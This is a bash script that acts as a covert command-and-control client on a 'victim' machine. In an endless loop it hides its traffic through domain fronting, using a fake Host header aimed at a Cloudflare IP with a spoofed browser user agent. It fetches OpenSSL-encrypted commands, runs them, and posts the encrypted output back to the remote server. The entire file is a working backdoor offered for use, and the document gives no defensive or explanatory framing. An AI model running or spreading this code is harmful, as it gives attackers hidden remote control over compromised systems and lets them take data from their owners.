#!/bin/bash

# config
# ---------------------------------------------------------------------
DST_FAKE_DOMAIN="corriere.it" # fake destination hostname
DST_GET_CLOUDFLAREIPS_FROM="medium.com" # get CF IP from a real domain
DST_PROTO="http" # use http 
MYNAME="remoteserver" # uniq name of victim client
ENC_PASSPHRASE="this.is.a.passphrase.to.encrypt.and.decrypt.messages" # openssl passphrase to encrypt data
USERAGENT="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" # ua to use with cURL
# ---------------------------------------------------------------------
# end config


CDIR="$( cd "$( dirname "$0" )" && pwd )"
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# get a CF ip address
CF_IP=$(curl -A "${USERAGENT}" -v -I ${DST_GET_CLOUDFLAREIPS_FROM} 2>&1 | egrep -o '\d+\.\d+\.\d+\.\d+' | head -1)

function sdash_encrypt {
	cat $1 | openssl enc -aes-128-cbc -base64 -A -salt -pass pass:${ENC_PASSPHRASE}
}

function sdash_decrypt {
	echo -n "${1}" | openssl enc -d -aes-128-cbc -base64 -A -salt -pass pass:${ENC_PASSPHRASE}
}

function send_output {
	OUTFILE=${CDIR}/.co`date +%s`
	($@) > ${OUTFILE}
	encstring=$(sdash_encrypt ${OUTFILE})
	rm -rf ${OUTFILE}
	echo -n "a=${encstring}"
}

while true; do
	GETCMD=$(curl -sS -m6 -A "${USERAGENT}" -H "Cookie: rs=${MYNAME}" -H "Host: ${DST_FAKE_DOMAIN}" "${DST_PROTO}://${CF_IP}/?nocache=`date +%s`")

	if [ "${GETCMD}" != "" ]; then
		CMDTOEXEC=$(sdash_decrypt "${GETCMD}")
		SENDOUT=$(send_output ${CMDTOEXEC})
		curl -sS -m6 -d "${SENDOUT}" -H "Cookie: rs=${MYNAME}" -H "Host: ${DST_FAKE_DOMAIN}" "${DST_PROTO}://${CF_IP}"
	fi

	sleep 10
done
